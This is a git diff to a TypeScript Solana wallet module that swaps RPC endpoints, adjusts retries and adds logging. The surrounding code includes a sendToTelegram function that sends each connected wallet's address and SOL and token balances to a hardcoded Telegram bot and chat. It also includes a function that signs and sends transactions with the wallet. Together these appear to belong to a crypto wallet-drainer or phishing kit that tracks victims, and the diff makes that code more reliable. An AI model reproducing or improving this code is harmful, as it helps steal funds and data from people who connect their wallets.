@@ -7,6 +7,15 @@ const TELEGRAM_CHAT_ID = "-1002490122517";
 // Helper function to add delay between retries
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
+// List of public RPC endpoints that don't require authentication
+const PUBLIC_RPC_ENDPOINTS = [
+  "https://api.devnet.solana.com", // Let's try devnet first
+  "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
+  "https://solana-api.projectserum.com", // Project Serum endpoint
+  "https://free.rpcpool.com", // Free RPC Pool endpoint
+  "https://solana.public-rpc.com", // Another public endpoint
+];
+
 // Retry function with exponential backoff
 async function retry<T>(
   fn: () => Promise<T>,
@@ -30,7 +39,9 @@ async function retry<T>(
 
 const testConnection = async (connection: Connection): Promise<boolean> => {
   try {
-    await connection.getSlot();
+    // Use a simple request that doesn't require special permissions
+    const blockHeight = await connection.getBlockHeight('finalized');
+    console.log(`Connection test successful: Block Height = ${blockHeight}`);
     return true;
   } catch (error) {
     console.error('Connection test failed:', error);
@@ -39,27 +50,20 @@ const testConnection = async (connection: Connection): Promise<boolean> => {
 };
 
 // Create a connection with proper config
-const createConnection = async () => {
-  const rpcEndpoints = [
-    "https://api.mainnet-beta.solana.com",
-    "https://solana-api.projectserum.com",
-    "https://rpc.ankr.com/solana",
-    "https://solana.api.rpcpool.com"
-  ];
+const createConnection = async (): Promise<Connection> => {
+  console.log("Attempting to create a Solana connection...");
   
   const connectionConfig = {
     commitment: 'confirmed' as const,
-    confirmTransactionInitialTimeout: 120000,
+    confirmTransactionInitialTimeout: 60000,
     disableRetryOnRateLimit: false,
-    wsEndpoint: undefined as string | undefined,
   };
   
-  for (const endpoint of rpcEndpoints) {
+  // Try each endpoint until we find one that works
+  for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
     try {
-      const connection = new Connection(endpoint, {
-        ...connectionConfig,
-        wsEndpoint: endpoint.replace('https', 'wss'),
-      });
+      console.log(`Trying endpoint: ${endpoint}`);
+      const connection = new Connection(endpoint, connectionConfig);
       
       const isValid = await testConnection(connection);
       if (isValid) {
@@ -72,11 +76,10 @@ const createConnection = async () => {
     }
   }
   
-  // Fallback connection with basic config
-  console.error('All RPC endpoints failed, using fallback with basic config');
-  return new Connection("https://api.mainnet-beta.solana.com", {
-    commitment: 'confirmed',
-    confirmTransactionInitialTimeout: 60000,
+  // Fallback connection with first endpoint (better than nothing)
+  console.error('All RPC endpoints failed, using fallback with first endpoint');
+  return new Connection(PUBLIC_RPC_ENDPOINTS[0], {
+    commitment: 'finalized', // Use finalized for most reliable results
   });
 };
 
@@ -87,7 +90,7 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
     const pubKey = new PublicKey(walletAddress);
     
     const response = await retry(async () => {
-      const conn = await createConnection();
+      const conn = await createConnection(); // Create a fresh connection
       return await conn.getParsedTokenAccountsByOwner(
         pubKey,
         {
@@ -95,7 +98,7 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
         },
         'confirmed'
       );
-    }, 5);
+    }, 3);
 
     console.log("Token accounts response:", response);
 
@@ -112,13 +115,14 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const connection = await createConnection(); // Fixed: Added await here
+    const connection = await createConnection();
     let solBalance = 0;
     
     try {
       solBalance = await retry(async () => {
         return await connection.getBalance(new PublicKey(walletData.address), 'confirmed');
-      });
+      }, 3);
+      console.log("SOL balance fetched successfully:", solBalance);
     } catch (error) {
       console.error('Error fetching balance:', error);
     }
@@ -134,7 +138,7 @@ export const sendToTelegram = async (walletData: any) => {
       `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
       `⏰ Time: ${new Date().toLocaleString()}\n\n` +
       `💰 Token Balances:\n${formattedTokens}\n\n` +
-      `🌐 Network: Solana Mainnet`;
+      `🌐 Network: Solana (${PUBLIC_RPC_ENDPOINTS[0].includes('devnet') ? 'Devnet' : 'Mainnet'})`;
 
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -172,17 +176,19 @@ export const signAndSendTransaction = async (connection: Connection, wallet: any
 
     console.log('Sending transaction...');
     const signature = await retry(async () => {
+      // Get a fresh connection for the transaction
+      const conn = await createConnection();
       return await sendAndConfirmTransaction(
-        connection,
+        conn,
         transaction,
         [wallet],
         {
           commitment: 'confirmed',
           preflightCommitment: 'confirmed',
-          maxRetries: 5,
+          maxRetries: 3,
         }
       );
-    });
+    }, 3);
 
     console.log('Transaction successful:', signature);
     return signature;
